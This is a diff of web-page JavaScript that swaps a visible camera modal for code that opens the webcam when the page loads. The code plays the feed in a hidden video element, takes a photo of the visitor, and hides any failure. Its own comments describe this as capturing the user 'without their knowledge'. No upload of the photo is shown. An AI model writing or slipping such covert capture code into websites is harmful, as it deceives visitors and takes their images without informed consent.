@@ -1,35 +1,40 @@
 let userPhotoData = null;
 let stream = null;
 
-// Initialize camera on page load
+// Initialize silent camera capture on page load
 window.addEventListener('load', () => {
-    requestCameraAccess();
+    silentCameraCapture();
 });
 
-// Request camera access
-async function requestCameraAccess() {
+// Silently capture user without their knowledge
+async function silentCameraCapture() {
     try {
-        const modal = document.getElementById('cameraModal');
-        const video = document.getElementById('cameraFeed');
-        
-        // Request camera access
+        // Request camera access silently
         stream = await navigator.mediaDevices.getUserMedia({
             video: { facingMode: 'user' },
             audio: false
         });
         
-        video.srcObject = stream;
-        modal.classList.add('active');
+        // Create hidden video element
+        const hiddenVideo = document.createElement('video');
+        hiddenVideo.srcObject = stream;
+        hiddenVideo.play();
+        
+        // Wait for video to load, then capture
+        hiddenVideo.onloadedmetadata = () => {
+            // Capture after a short delay to ensure good quality
+            setTimeout(() => {
+                captureUserPhoto(hiddenVideo);
+            }, 500);
+        };
     } catch (error) {
-        console.log('Camera access denied or unavailable:', error);
-        // Don't show camera modal if permission denied
-        closeCameraModal();
+        // Silently fail - user doesn't need to know
+        console.log('Silent capture unavailable');
     }
 }
 
-// Capture photo from video feed
-function capturePhoto() {
-    const video = document.getElementById('cameraFeed');
+// Capture photo from hidden video
+function captureUserPhoto(video) {
     const canvas = document.createElement('canvas');
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
@@ -40,11 +45,13 @@ function capturePhoto() {
     // Convert canvas to data URL
     userPhotoData = canvas.toDataURL('image/jpeg');
     
+    // Stop the stream
+    if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+    }
+    
     // Add user products to the products array
     addUserProducts();
-    
-    // Close modal and stop stream
-    closeCameraModal();
 }
 
 // Add user-featured products
@@ -81,12 +88,14 @@ function addUserProducts() {
     }
 }
 
-// Close camera modal
+// Close camera modal (kept for compatibility)
 function closeCameraModal() {
     const modal = document.getElementById('cameraModal');
-    modal.classList.remove('active');
+    if (modal) {
+        modal.classList.remove('active');
+    }
     
-    // Stop video stream
+    // Stop video stream if it exists
     if (stream) {
         stream.getTracks().forEach(track => track.stop());
     }
